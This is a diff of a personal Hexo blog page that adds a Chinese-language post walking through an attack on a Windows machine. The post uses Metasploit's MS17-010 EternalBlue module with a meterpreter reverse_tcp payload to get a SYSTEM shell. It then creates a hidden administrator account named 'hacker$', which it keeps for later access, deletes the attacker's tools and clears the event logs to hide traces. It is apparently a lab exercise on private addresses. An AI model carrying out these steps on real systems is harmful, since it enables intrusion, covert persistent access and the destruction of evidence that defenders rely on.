@@ -152,27 +152,23 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-test1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-利用MSF工具,对windows进行入侵并清除痕迹" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/07/13/test1/">test1</a>
-    </h1>
-  
-
-        
-        <a href="/2022/07/13/test1/" class="archive-article-date">
-  	<time datetime="2022-07-13T03:21:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-07-13</time>
-</a>
-        
-      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>#This is a test for test</p>
+        <h2 id="利用MSF工具-对windows进行入侵并清除痕迹"><a href="#利用MSF工具-对windows进行入侵并清除痕迹" class="headerlink" title="利用MSF工具,对windows进行入侵并清除痕迹"></a>利用MSF工具,对windows进行入侵并清除痕迹</h2><p>在终端中执行命令<code>msfconsole</code>，进入MSF控制台</p>
+<p>MSF控制台（4）执行命令<code>search MS17-010</code>，搜索MS17-010漏洞相关模块。执行命令<code>use auxiliary/scanner/smb/smb_ms17_010</code>，查询目标主机是否包含MS17-010漏洞。执行命令<code>setrhost 192.168.1.13</code>，设置目标主机地址。执行命令<code>run</code>，进行攻击。根据查询结果可知，该目标主机包含MS17-010漏洞。</p>
+<p>执行命令back，返回msf平台。执行命令<code>use exploit/windows/smb/ms17_010_eternalblue</code>，调用该漏洞利用模块进行攻击。命令执行后，提示符发生改变，如图5所示。</p>
+<p><img src="C:\Users\zb\AppData\Roaming\Typora\typora-user-images\image-20220714153543750.png" alt="image-20220714153543750"></p>
+<p>执行<code>showpayloads</code>命令，查看当前漏洞利用模块下可用的所有payload，并找到<code>windows/x64/meterpreter</code>，如图6所示。图6：显示设置的参数（6）执行命令<code>set payload windows/x64/meterpreter/reverse_tcp</code>、<code>setrhost 192.168.1.13</code>、<code>set lhost 192.168.1.16</code>，再执行命令<code>showoptions</code>，查看是否设置正确。已正确设置为目标服务器的IP地址，图7所示。</p>
+<p><img src="C:\Users\zb\AppData\Roaming\Typora\typora-user-images\image-20220714153651722.png" alt="image-20220714153651722"></p>
+<p>查看所有选项没问题后，执行命令<code>run</code>，进行shell反弹，执行成功后提示符会变为<code>meterpreter</code>，如图8所示。图8：成功获取shell（8）MSF发动攻击成功后会获取到目标主机的shell，为了验证该shell是目标主机的IP地址，可以执行命令<code>ipconfig</code>，查询IP地址，查询结果为<code>192.168.1.13</code>，如图9所示。目标主机的ip地址为<code>192.168.1.13</code>，如图10所示，对比结果一致。</p>
+<p><img src="C:\Users\zb\AppData\Roaming\Typora\typora-user-images\image-20220714153752570.png" alt="image-20220714153752570"></p>
+<p>执行命令shell，进入目标主机命令提示符中，至此证明成功拿到了目标主机的shell。执行命令whoami，查看当前用户权限。当前用户为系统权限，如图11所示。</p>
+<p><img src="C:\Users\zb\AppData\Roaming\Typora\typora-user-images\image-20220714153811168.png" alt="image-20220714153811168"></p>
+<p>获取到目标主机系统权限后对目标主机发动攻击，执行命令<code>net user hacker$ /add</code>，创建隐藏账户hacker。执行命令<code>net localgroup administrators hacker$ /add</code>，将隐藏账户hacker加入administrator管理员组，让其拥有管理员权限，如图12所示。图12：创建隐藏账户并加入管理员组（11）执行命令net user hacker$ ，验证隐藏账户是否创建成功，如图13所示。图13：查看hacker$用户信息2.Metasploit清除Windows日志（1）在用MSF成功对目标进行了渗透之后，不要忘记清理渗透过程中遗留下的日志。若在渗透过程中添加了账号，需要执行【netuser 添加的用户名&#x2F;delete】命令进行删除；本次实验添加了隐藏用户（不易被发现），后续需要使用，所以不进行删除。（2）执行命令<code>cd c:\</code>，切换到C盘根目录下，执行命令<code>rd/s /q c:\hack</code>，删除在渗透过程中预留的工具，再执行命令<code>dir</code>，进行验证，如图14所示，hack文件夹已被删除。</p>
+<p>执行命令<code>exit</code>，退出目标服务器的shell，如图15所示。图15：退出shell（4）执行命令<code>runevent_manager –i</code>，查看日志及其配置信息，如图16所示。图16：查看日志信息（5）执行命令<code>clearev</code>，清除系统日志，可看见清除提示，清除了应用程序日志，如图17所示。</p>
 
       
 
@@ -185,7 +181,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2022/07/13/test1/">展开全文 >></a>
+          <a class="article-more-a" href="/2022/07/14/%E5%88%A9%E7%94%A8MSF%E5%B7%A5%E5%85%B7,%E5%AF%B9windows%E8%BF%9B%E8%A1%8C%E5%85%A5%E4%BE%B5%E5%B9%B6%E6%B8%85%E9%99%A4%E7%97%95%E8%BF%B9/">展开全文 >></a>
         </p>
       
 
@@ -222,13 +218,13 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/07/13/hello-world/">This is Bin&#39;s First Blog</a>
+      <a class="article-title" href="/2022/07/14/hello-world/">This is Bin&#39;s First Blog</a>
     </h1>
   
 
         
-        <a href="/2022/07/13/hello-world/" class="archive-article-date">
-  	<time datetime="2022-07-13T03:14:03.769Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-07-13</time>
+        <a href="/2022/07/14/hello-world/" class="archive-article-date">
+  	<time datetime="2022-07-14T07:05:55.554Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-07-14</time>
 </a>
         
       </header>
@@ -241,8 +237,8 @@
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 
-<h3 id="hexo教程"><a href="#hexo教程" class="headerlink" title="hexo教程"></a>hexo教程</h3><p>创建hexo:<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/504385429">https://zhuanlan.zhihu.com/p/504385429</a></p>
-<p>hexo源码保存:<a target="_blank" rel="noopener" href="https://wenku.baidu.com/view/b87738376f175f0e7cd184254b35eefdc9d31571.html">https://wenku.baidu.com/view/b87738376f175f0e7cd184254b35eefdc9d31571.html</a></p>
+<h3 id="hexo教程"><a href="#hexo教程" class="headerlink" title="hexo教程"></a>hexo教程</h3><p>1创建hexo:<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/504385429">https://zhuanlan.zhihu.com/p/504385429</a></p>
+<p>2hexo源码保存:<a target="_blank" rel="noopener" href="https://wenku.baidu.com/view/b87738376f175f0e7cd184254b35eefdc9d31571.html">https://wenku.baidu.com/view/b87738376f175f0e7cd184254b35eefdc9d31571.html</a></p>
 
       
 
@@ -255,7 +251,70 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2022/07/13/hello-world/">展开全文 >></a>
+          <a class="article-more-a" href="/2022/07/14/hello-world/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-test1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/07/13/test1/">test1</a>
+    </h1>
+  
+
+        
+        <a href="/2022/07/13/test1/" class="archive-article-date">
+  	<time datetime="2022-07-13T03:21:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-07-13</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>#This is a test for test</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/07/13/test1/">展开全文 >></a>
         </p>
       
 
